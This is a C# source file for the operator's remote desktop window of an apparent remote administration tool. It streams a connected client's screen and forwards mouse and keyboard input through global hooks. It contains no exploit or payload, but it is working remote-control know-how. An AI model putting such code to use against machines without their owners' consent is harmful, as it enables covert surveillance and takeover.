using System;
using System.Drawing;
using System.Windows.Forms;
using System.Collections.Generic;
using xServer.Core.Helper;
using xServer.Core.Networking;
using xServer.Core.Utilities;
using xServer.Core.MouseKeyHook;
using xServer.Enums;

namespace xServer.Forms
{
    public partial class FrmRemoteDesktop : Form
    {
        public bool IsStarted { get; private set; }
        private readonly Client _connectClient;
        private bool _enableMouseInput;
        private bool _enableKeyboardInput;
        private IKeyboardMouseEvents _keyboardHook;
        private IKeyboardMouseEvents _mouseHook;
        private List<Keys> _keysPressed;

        public FrmRemoteDesktop(Client c)
        {
            _connectClient = c;
            _connectClient.Value.FrmRdp = this;

            SubscribeEvents();
            InitializeComponent();
        }

        private void FrmRemoteDesktop_Load(object sender, EventArgs e)
        {
            this.Text = WindowHelper.GetWindowTitle("Remote Desktop", _connectClient);

            panelTop.Left = (this.Width / 2) - (panelTop.Width / 2);

            btnHide.Left = (panelTop.Width / 2) - (btnHide.Width / 2);

            btnShow.Location = new Point(377, 0);
            btnShow.Left = (this.Width / 2) - (btnShow.Width / 2);

            _keysPressed = new List<Keys>();

            if (_connectClient.Value != null)
                new Core.Packets.ServerPackets.GetMonitors().Execute(_connectClient);
        }

        /// <summary>
        /// Subscribes the local mouse and keyboard hooks.
        /// </summary>
        private void SubscribeEvents()
        {
            if (PlatformHelper.RunningOnMono) // Mono/Linux
            {
                this.KeyDown += OnKeyDown;
                this.KeyUp += OnKeyUp;
            }
            else // Windows
            {
                _keyboardHook = Hook.GlobalEvents();
                _keyboardHook.KeyDown += OnKeyDown;
                _keyboardHook.KeyUp += OnKeyUp;

                _mouseHook = Hook.AppEvents();
                _mouseHook.MouseWheel += OnMouseWheelMove;
            }
        }

        /// <summary>
        /// Unsubscribes the local mouse and keyboard hooks.
        /// </summary>
        private void UnsubscribeEvents()
        {
            if (PlatformHelper.RunningOnMono) // Mono/Linux
            {
                this.KeyDown -= OnKeyDown;
                this.KeyUp -= OnKeyUp;
            }
            else // Windows
            {
                if (_keyboardHook != null)
                {
                    _keyboardHook.KeyDown -= OnKeyDown;
                    _keyboardHook.KeyUp -= OnKeyUp;
                    _keyboardHook.Dispose();
                }
                if (_mouseHook != null)
                {
                    _mouseHook.MouseWheel -= OnMouseWheelMove;
                    _mouseHook.Dispose();
                }
            }
        }

        public void AddMonitors(int monitors)
        {
            try
            {
                cbMonitors.Invoke((MethodInvoker)delegate
                {
                    for (int i = 0; i < monitors; i++)
                        cbMonitors.Items.Add(string.Format("Monitor {0}", i + 1));
                    cbMonitors.SelectedIndex = 0;
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        public void UpdateImage(Bitmap bmp, bool cloneBitmap = false)
        {
            picDesktop.UpdateImage(bmp, cloneBitmap);
        }

        private void _frameCounter_FrameUpdated(FrameUpdatedEventArgs e)
        {
            try
            {
                this.Invoke((MethodInvoker)delegate
                {
                    this.Text = string.Format("{0} - FPS: {1}", WindowHelper.GetWindowTitle("Remote Desktop", _connectClient), e.CurrentFramesPerSecond.ToString("0.00"));
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        private void ToggleControls(bool t)
        {
            IsStarted = !t;
            try
            {
                this.Invoke((MethodInvoker)delegate
                {
                    btnStart.Enabled = t;
                    btnStop.Enabled = !t;
                    barQuality.Enabled = t;
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        private void FrmRemoteDesktop_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (!picDesktop.IsDisposed && !picDesktop.Disposing)
                picDesktop.Dispose();
            if (_connectClient.Value != null)
                _connectClient.Value.FrmRdp = null;

            UnsubscribeEvents();
        }

        private void FrmRemoteDesktop_Resize(object sender, EventArgs e)
        {
            panelTop.Left = (this.Width/2) - (panelTop.Width/2);
            btnShow.Left = (this.Width/2) - (btnShow.Width/2);
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            if (cbMonitors.Items.Count == 0)
            {
                MessageBox.Show("No monitor detected.\nPlease wait till the client sends a list with available monitors.",
                    "Starting failed", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            ToggleControls(false);

            picDesktop.Start();

            // Subscribe to the new frame counter.
            picDesktop.SetFrameUpdatedEvent(_frameCounter_FrameUpdated);

            this.ActiveControl = picDesktop;

            new Core.Packets.ServerPackets.GetDesktop(barQuality.Value, cbMonitors.SelectedIndex).Execute(_connectClient);
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            ToggleControls(true);

            picDesktop.Stop();

            // Unsubscribe from the frame counter. It will be re-created when starting again.
            picDesktop.UnsetFrameUpdatedEvent(_frameCounter_FrameUpdated);

            this.ActiveControl = picDesktop;
        }

        private void barQuality_Scroll(object sender, EventArgs e)
        {
            int value = barQuality.Value;
            lblQualityShow.Text = value.ToString();

            if (value < 25)
                lblQualityShow.Text += " (low)";
            else if (value >= 85)
                lblQualityShow.Text += " (best)";
            else if (value >= 75)
                lblQualityShow.Text += " (high)";
            else if (value >= 25)
                lblQualityShow.Text += " (mid)";

            this.ActiveControl = picDesktop;
        }

        private void btnMouse_Click(object sender, EventArgs e)
        {
            if (_enableMouseInput)
            {
                this.picDesktop.Cursor = Cursors.Default;
                btnMouse.Image = Properties.Resources.mouse_delete;
                toolTipButtons.SetToolTip(btnMouse, "Enable mouse input.");
                _enableMouseInput = false;
            }
            else
            {
                this.picDesktop.Cursor = Cursors.Hand;
                btnMouse.Image = Properties.Resources.mouse_add;
                toolTipButtons.SetToolTip(btnMouse, "Disable mouse input.");
                _enableMouseInput = true;
            }

            this.ActiveControl = picDesktop;
        }

        private void btnKeyboard_Click(object sender, EventArgs e)
        {
            if (_enableKeyboardInput)
            {
                this.picDesktop.Cursor = Cursors.Default;
                btnKeyboard.Image = Properties.Resources.keyboard_delete;
                toolTipButtons.SetToolTip(btnKeyboard, "Enable keyboard input.");
                _enableKeyboardInput = false;
            }
            else
            {
                this.picDesktop.Cursor = Cursors.Hand;
                btnKeyboard.Image = Properties.Resources.keyboard_add;
                toolTipButtons.SetToolTip(btnKeyboard, "Disable keyboard input.");
                _enableKeyboardInput = true;
            }

            this.ActiveControl = picDesktop;
        }

        private int GetRemoteWidth(int localX)
        {
            return localX * picDesktop.ScreenWidth / picDesktop.Width;
        }

        private int GetRemoteHeight(int localY)
        {
            return localY * picDesktop.ScreenHeight / picDesktop.Height;
        }

        private void picDesktop_MouseDown(object sender, MouseEventArgs e)
        {
            if (picDesktop.Image != null && _enableMouseInput && IsStarted && this.ContainsFocus)
            {
                int local_x = e.X;
                int local_y = e.Y;

                int remote_x = GetRemoteWidth(local_x);
                int remote_y = GetRemoteHeight(local_y);

                MouseAction action = MouseAction.None;

                if (e.Button == MouseButtons.Left)
                    action = MouseAction.LeftDown;
                if (e.Button == MouseButtons.Right)
                    action = MouseAction.RightDown;

                int selectedMonitorIndex = cbMonitors.SelectedIndex;

                if (_connectClient != null)
                    new Core.Packets.ServerPackets.DoMouseEvent(action, true, remote_x, remote_y, selectedMonitorIndex).Execute(_connectClient);
            }
        }

        private void picDesktop_MouseUp(object sender, MouseEventArgs e)
        {
            if (picDesktop.Image != null && _enableMouseInput && IsStarted && this.ContainsFocus)
            {
                int local_x = e.X;
                int local_y = e.Y;

                int remote_x = GetRemoteWidth(local_x);
                int remote_y = GetRemoteHeight(local_y);

                MouseAction action = MouseAction.None;

                if (e.Button == MouseButtons.Left)
                    action = MouseAction.LeftDown;
                if (e.Button == MouseButtons.Right)
                    action = MouseAction.RightDown;

                int selectedMonitorIndex = cbMonitors.SelectedIndex;

                if (_connectClient != null)
                    new Core.Packets.ServerPackets.DoMouseEvent(action, false, remote_x, remote_y, selectedMonitorIndex).Execute(_connectClient);
            }
        }

        private void picDesktop_MouseMove(object sender, MouseEventArgs e)
        {
            if (picDesktop.Image != null && _enableMouseInput && IsStarted && this.ContainsFocus)
            {
                int local_x = e.X;
                int local_y = e.Y;

                int remote_x = GetRemoteWidth(local_x);
                int remote_y = GetRemoteHeight(local_y);

                int selectedMonitorIndex = cbMonitors.SelectedIndex;

                if (_connectClient != null)
                    new Core.Packets.ServerPackets.DoMouseEvent(MouseAction.MoveCursor, false, remote_x, remote_y, selectedMonitorIndex).Execute(_connectClient);
            }
        }

        private void OnMouseWheelMove(object sender, MouseEventArgs e)
        {
            if (picDesktop.Image != null && _enableMouseInput && IsStarted && this.ContainsFocus)
            {
                if (_connectClient != null)
                    new Core.Packets.ServerPackets.DoMouseEvent(e.Delta == 120 ? MouseAction.ScrollUp : MouseAction.ScrollDown, false, 0, 0, cbMonitors.SelectedIndex).Execute(_connectClient);
            }
        }

        private void OnKeyDown(object sender, KeyEventArgs e)
        {
            if (picDesktop.Image != null && _enableKeyboardInput && IsStarted && this.ContainsFocus)
            {
                if (!IsLockKey(e.KeyCode))
                    e.Handled = true;

                if (_keysPressed.Contains(e.KeyCode))
                    return;

                _keysPressed.Add(e.KeyCode);

                if (_connectClient != null)
                    new Core.Packets.ServerPackets.DoKeyboardEvent((byte)e.KeyCode, true).Execute(_connectClient);
            }
        }

        private void OnKeyUp(object sender, KeyEventArgs e)
        {
            if (picDesktop.Image != null && _enableKeyboardInput && IsStarted && this.ContainsFocus)
            {
                if (!IsLockKey(e.KeyCode))
                    e.Handled = true;

                _keysPressed.Remove(e.KeyCode);

                if (_connectClient != null)
                    new Core.Packets.ServerPackets.DoKeyboardEvent((byte)e.KeyCode, false).Execute(_connectClient);
            }
        }

        private bool IsLockKey(Keys key)
        {
            return ((key & Keys.CapsLock) == Keys.CapsLock)
                || ((key & Keys.NumLock) == Keys.NumLock)
                || ((key & Keys.Scroll) == Keys.Scroll);
        }

        private void btnHide_Click(object sender, EventArgs e)
        {
            panelTop.Visible = false;
            btnShow.Visible = true;
            btnHide.Visible = false;
            this.ActiveControl = picDesktop;
        }

        private void btnShow_Click(object sender, EventArgs e)
        {
            panelTop.Visible = true;
            btnShow.Visible = false;
            btnHide.Visible = true;
            this.ActiveControl = picDesktop;
        }
    }
}